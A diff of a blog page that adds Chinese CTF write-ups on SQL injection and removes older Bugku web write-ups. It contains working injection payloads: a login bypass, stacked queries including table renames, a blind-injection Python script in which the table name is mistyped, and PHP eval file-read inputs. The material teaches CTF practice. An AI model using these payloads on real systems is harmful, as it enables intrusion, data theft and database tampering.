@@ -231,6 +231,179 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2021/05/12/SQL%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/image/avatar.jpg">
+      <meta itemprop="name" content="左">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="左">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/05/12/SQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-05-12 00:00:00" itemprop="dateCreated datePublished" datetime="2021-05-12T00:00:00+08:00">2021-05-12</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-07-19 19:08:14" itemprop="dateModified" datetime="2021-07-19T19:08:14+08:00">2021-07-19</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019] EasySQL"></a>[极客大挑战 2019] EasySQL</h2><h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><p>题目：</p>
+<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E9%A2%98%E7%9B%AE.png"></p>
+<p>页面为登陆模式，需要输入用户名和密码</p>
+<p>尝试输入1，结果提示用户名和密码错误；</p>
+<p>在<code>username</code>处加个常规的<code>&#39;</code>，结果报错了：</p>
+<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E6%8A%A5%E9%94%99.png"></p>
+<p>考虑到是SQL注入，于是在用户名和密码均输入万能密码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
+<p>成功登录，得到flag</p>
+<h2 id="SUCTF-2019-EasySQL1"><a href="#SUCTF-2019-EasySQL1" class="headerlink" title="[SUCTF 2019]EasySQL1"></a>[SUCTF 2019]EasySQL1</h2><h3 id="判断注入方法"><a href="#判断注入方法" class="headerlink" title="判断注入方法"></a>判断注入方法</h3><p>显注：union 联合查询，union被过滤</p>
+<p>报错注入：and、or、updatexml被过滤。没有报错信息，报错注入基本不用考虑</p>
+<p>bool注入：and、or被过滤。不管怎么样都是返回nonono，就连数据库长度大于1这种探针都返回nonono，说明应该不是bool注入</p>
+<p>time注入：and、or被过滤。</p>
+<p><strong>堆叠注入</strong>：考虑到过滤了很多关键词，尝试堆叠查询，这个可使用的语句比较多。就是一个sql语句”;”后面可以继续执行sql查询语句</p>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p><strong>post 传参</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;show databases;   #查询数据库</span><br><span class="line">1;show tables;      #查询表名</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/tables.png"></p>
+<p>构造<strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure>
+
+<p>拼接一下，就是：<code>select *,1||flag from Flag</code></p>
+<p>等同于<code>select *,1 from Flag</code></p>
+<p><strong>查询语句</strong>：<code>select *,1||flag from Flag</code></p>
+<ul>
+<li><p>sql=select.post[‘query’].”||flag from Flag”;<br>如果$post[‘query’]的数据为*,1，sql语句就变成了<code>select *,1||flag from Flag</code>，<br>就是select *,1 from Flag，这样就直接查询出了Flag表中的所有内容。</p>
+</li>
+<li><p><code>||</code>在mysql中表示或，如果前一个操作数为真，则不看后面的语句</p>
+<p><code>||</code>相当于将 select 1 和 select flag from flag 的结果拼接在一起</p>
+</li>
+<li><p>select任何一个常数都会在表中新建一列，即增加一个临时列，列名是1。然后查询出那一列的内容。<code>select 1 from Flag</code>的结果就是那一列的值都为1，这一列有几个字段取决于原字段的多少。</p>
+</li>
+</ul>
+<p>整个payload语句的意思就是查询所有数据，然后增加一个临时列</p>
+<p>第一列是本来数据库的，后面是新增的临时列</p>
+<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/1.flag.png"></p>
+<h2 id="强网杯-2019-随便注-1"><a href="#强网杯-2019-随便注-1" class="headerlink" title="[强网杯 2019]随便注 1"></a>[强网杯 2019]随便注 1</h2><h3 id="堆叠注入-1"><a href="#堆叠注入-1" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>题目标题直接就是easy_sql，即sql注入。</p>
+<p>输入<code>1&#39;</code>，发现报错</p>
+<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/1'.png"></p>
+<p>于是利用<code>#</code>进行截断（注释掉）：<code>1&#39; #</code></p>
+<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/1'"></p>
+<p>回显正常</p>
+<p>尝试<code>1&#39; or 1=1 #</code></p>
+<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/1&#39;">https://gitee.com/chen-lishan/tuc/raw/master/1&#39;</a> or 1=1 )</p>
+<h4 id="判断字段数量"><a href="#判断字段数量" class="headerlink" title="判断字段数量"></a>判断字段数量</h4><p>输入<code>1&#39; order by 1#</code>，正常回显</p>
+<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/1&#39;">https://gitee.com/chen-lishan/tuc/raw/master/1&#39;</a> order by 1)</p>
+<p>输入<code>1&#39; order by 2#</code>，也是正常回显</p>
+<p>而输入<code>1&#39; order by 3#</code>，报错了，说明字段数为2</p>
+<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/1&#39;">https://gitee.com/chen-lishan/tuc/raw/master/1&#39;</a> order by 3)</p>
+<h4 id="判断显注点"><a href="#判断显注点" class="headerlink" title="判断显注点"></a>判断显注点</h4><ul>
+<li><p>union 联合查询判断显注点：<code>1&#39; union select 1,2 #</code></p>
+<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/1&#39;">https://gitee.com/chen-lishan/tuc/raw/master/1&#39;</a> union select 1,2 )</p>
+<p><code>preg_match</code>正则匹配，过滤掉<code>select|update|delete|drop|insert|where|</code></p>
+</li>
+</ul>
+<p>很多常用的字段都被过滤了</p>
+<p>想到堆叠注入</p>
+<h4 id="堆叠注入-2"><a href="#堆叠注入-2" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p><code>1&#39; ; show databases;#</code></p>
+<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/1&#39;">https://gitee.com/chen-lishan/tuc/raw/master/1&#39;</a> ; show databases;)</p>
+<p>成功回显，于是查询表名</p>
+<p><code>1&#39; ; show tables;#</code></p>
+<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/1&#39;">https://gitee.com/chen-lishan/tuc/raw/master/1&#39;</a> ; show tables;)</p>
+<p>查询两个表中的列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; ; show columns from words;#</span><br></pre></td></tr></table></figure>
+
+<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/1&#39;">https://gitee.com/chen-lishan/tuc/raw/master/1&#39;</a> ; show columns from words;)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; ; show columns from &#96;1919810931114514&#96;;#</span><br></pre></td></tr></table></figure>
+
+<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/1&#39;">https://gitee.com/chen-lishan/tuc/raw/master/1&#39;</a> ; show columns from <code>1919810931114514</code>;)</p>
+<h3 id="修改表名和列名"><a href="#修改表名和列名" class="headerlink" title="修改表名和列名"></a>修改表名和列名</h3><p>words表（含id 和data列）会回显具体内容；而1919810931114514表（含flag列）中的内容无法显示出来，即flag列在1919810931114514表中无法显示。</p>
+<p>因此需要：</p>
+<ul>
+<li>将表名words换为其他的，如word1</li>
+<li>将表名1919810931114514换为words</li>
+<li>将列名flag换为id</li>
+</ul>
+<p>构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; ; rename tables &#96;words&#96; to &#96;word1&#96; ; rename tables &#96;1919810931114514&#96; to &#96;words&#96; ;  alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100);# </span><br></pre></td></tr></table></figure>
+
+<p>这样就改变了数据库结构，输入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1’ or 1&#x3D;1#</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><h4 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h4><p>题目提示是sql注入</p>
+<p>简单测试一下，输入不同的字符会有不同的回显，输入<code>1&#39;</code>，返回bool（false），那么，应该是<strong>bool注入</strong></p>
+<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/bool.png"></p>
+<p>测试发现，ascii、substr都没有被过滤；空格被过滤了，可以使用()代替</p>
+<h4 id="POST传参"><a href="#POST传参" class="headerlink" title="POST传参"></a><strong>POST传参</strong></h4><p><strong>POST传参</strong>，payload写在下方，<code>id=</code></p>
+<p>而GET传参，payload应连在网址后面</p>
+<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/post.png"></p>
+<h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><p>题目提示：All You Want Is In Table ‘flag’ and the column is ‘flag’</p>
+<p>flag在flag表的flag字段中，于是可以写<code>select(flag)from(flag)</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0^(ascii(substr((select(flag)from(flag)),1,1))&#x3D;ascii(&#39;f&#39;))</span><br></pre></td></tr></table></figure>
+
+<p><code>^</code>是异或，意思是or</p>
+<h4 id="二分脚本"><a href="#二分脚本" class="headerlink" title="二分脚本"></a>二分脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&#x27;http://b983611d-30c5-4eef-bd3d-4178a5d4656b.node3.buuoj.cn&#x27;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    high=<span class="number">127</span></span><br><span class="line">    low=<span class="number">32</span></span><br><span class="line">    mid=(high+low)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high&gt;low:</span><br><span class="line">        payload=<span class="string">&quot;0^&quot;</span> + <span class="string">&quot;(ascii(substr((select(flag)from(ftlag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span>.format(x,mid)</span><br><span class="line">        data=&#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">        html=requests.post(url,data=data).text</span><br><span class="line">        <span class="comment">#time.sleep(0.5)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> html:</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(low+high)//<span class="number">2</span></span><br><span class="line">    result+=chr(int(mid))</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
+
+<p><strong>format 函数</strong>：</p>
+<p>通过 <code>&#123;&#125;</code>和 <code>: </code>来代替以前的 <code>%</code> 。format 函数可以接受不限个参数，位置可以不按顺序。</p>
+<p>得到flag：</p>
+<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/3.flag.png" alt="img"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://-181.github.io/2021/04/22/CSP%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%B9%8B%E9%9A%90%E8%97%8F%E5%9B%BE%E5%83%8F/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -451,148 +624,6 @@
 <p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E9%9A%90%E5%86%99.png"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">falg&#123;This is_4_hldden Fl4g&#125;</span><br></pre></td></tr></table></figure>
 
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2021/03/27/Bugku%20CTF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/image/avatar.jpg">
-      <meta itemprop="name" content="左">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="左">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/27/Bugku%20CTF/" class="post-title-link" itemprop="url">Bugku CTF</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-03-27 00:00:00" itemprop="dateCreated datePublished" datetime="2021-03-27T00:00:00+08:00">2021-03-27</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2021-07-19 17:27:52" itemprop="dateModified" datetime="2021-07-19T17:27:52+08:00">2021-07-19</time>
-      </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="Bugku-CTF"><a href="#Bugku-CTF" class="headerlink" title="Bugku CTF"></a>Bugku CTF</h2><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>题目</p>
-<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/web2.1.png"></p>
-<p>像这种反弹flag的题目，直接查看页面源代码，绝对有链接指向flag，比如这题的js/code.js， 以小见大，以后在渗透测试过程中，要养成检查页面源代码的习惯，有时候会暴露内网地址，重要路径等重要信息</p>
-<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/web2.png"></p>
-<h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>题目直接就是一串代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$what&#x3D;$_GET[&#39;what&#39;];</span><br><span class="line"> echo $what;</span><br><span class="line"> if($what&#x3D;&#x3D;&#39;flag&#39;)</span><br><span class="line"> echo &#39;flag&#123;****&#125;&#39;;</span><br></pre></td></tr></table></figure>
-
-<p>根据代码，如果get参数what的值等于flag则输出flag，那么，可以用<strong>get传参</strong>，在URL里面输入满足条件即可</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">网址?what&#x3D;flag</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-<h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>题目</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$what&#x3D;$_POST[&#39;what&#39;];</span><br><span class="line">echo $what;</span><br><span class="line">if($what&#x3D;&#x3D;&#39;flag&#39;)</span><br><span class="line">echo &#39;flag&#123;****&#125;&#39;;</span><br></pre></td></tr></table></figure>
-
-<p>类似上题，<strong>POST传参</strong></p>
-<p>HackBar，POST输入<code>what=flag</code></p>
-<h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p>题目</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$num&#x3D;$_GET[&#39;num&#39;];</span><br><span class="line">if(!is_numeric($num))</span><br><span class="line">&#123;</span><br><span class="line">echo $num;</span><br><span class="line">if($num&#x3D;&#x3D;1)</span><br><span class="line">echo &#39;flag&#123;**********&#125;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>php 弱类型比较</p>
-<p><code>is_numeric()</code> <em>函数</em>  用于检测变量是否为数字或数字字符串。需要输入非数字</p>
-<p>php是弱类型语言，双等号判断 1 == （以1开头的字符串） 结果都为true</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>打开题目，关闭掉无限弹窗之后，一片空白，什么也没有</p>
-<p>查看源码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;head&gt;  </span><br><span class="line">&lt;title&gt;BKCTF-WEB6&lt;&#x2F;title&gt;  </span><br><span class="line">&lt;script language&#x3D;&quot;javascript&quot;&gt;    </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;);  </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;);  </span><br><span class="line">&lt;!-- &amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#57;&amp;#102;&amp;#53;&amp;#49;&amp;#102;&amp;#49;&amp;#97;&amp;#100;&amp;#51;&amp;#97;&amp;#100;&amp;#100;&amp;#49;&amp;#55;&amp;#50;&amp;#97;&amp;#102;&amp;#56;&amp;#57;&amp;#50;&amp;#50;&amp;#48;&amp;#51;&amp;#49;&amp;#97;&amp;#97;&amp;#48;&amp;#98;&amp;#53;&amp;#101;&amp;#48;&amp;#56;&amp;#125; --&gt;&lt;&#x2F;script&gt;  </span><br><span class="line">&lt;&#x2F;head&gt;  </span><br><span class="line">&lt;&#x2F;html&gt;  </span><br></pre></td></tr></table></figure>
-
-<p>看最后一行，在<!---->&gt;里就是flag，只不过是&amp;#开头编码后的，是采用Unicode编码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#57;&amp;#102;&amp;#53;&amp;#49;&amp;#102;&amp;#49;&amp;#97;&amp;#100;&amp;#51;&amp;#97;&amp;#100;&amp;#100;&amp;#49;&amp;#55;&amp;#50;&amp;#97;&amp;#102;&amp;#56;&amp;#57;&amp;#50;&amp;#50;&amp;#48;&amp;#51;&amp;#49;&amp;#97;&amp;#97;&amp;#48;&amp;#98;&amp;#53;&amp;#101;&amp;#48;&amp;#56;&amp;#125;</span><br></pre></td></tr></table></figure>
-
-<p>将这一段注释复制，打开BurpSuite自带的编码解码及散列转换工具Decoder，选择HEML格式解码，找到flag</p>
-<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>题目</p>
-<p><img src="D:\图片\信安。。\h\web7.png"></p>
-<p>一直自动刷新，有以上这样的CTF图案，还有不出现图片的</p>
-<p>直接查看源码</p>
-<p><img src="D:\图片\信安。。\h\web7...png"></p>
-<p>可以看到flag is here</p>
-<p>在此页面一直刷新，直到出现flag</p>
-<p><img src="D:\图片\信安。。\h\web7..png"></p>
-<h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p>题目：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    $a &#x3D; @$_REQUEST[&#39;hello&#39;];</span><br><span class="line">    eval( &quot;var_dump($a);&quot;);</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
-
-<p>var_dump()函数可以打印</p>
-<p>可以用hello读文件</p>
-<p>payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?hello&#x3D;file(&#39;flag.php&#39;)</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><p>题目：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag1.php&quot;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;args&#x27;</span>]))&#123;</span><br><span class="line">    $args = $_GET[<span class="string">&#x27;args&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/^\w+$/&quot;</span>,$args))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;args error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$args</span>);&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>globals函数</p>
-<p>payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?args&#x3D;GLOBALS</span><br></pre></td></tr></table></figure>
-
-<p>?args=file(‘flag1.php’)</p>
 
       
     </div>
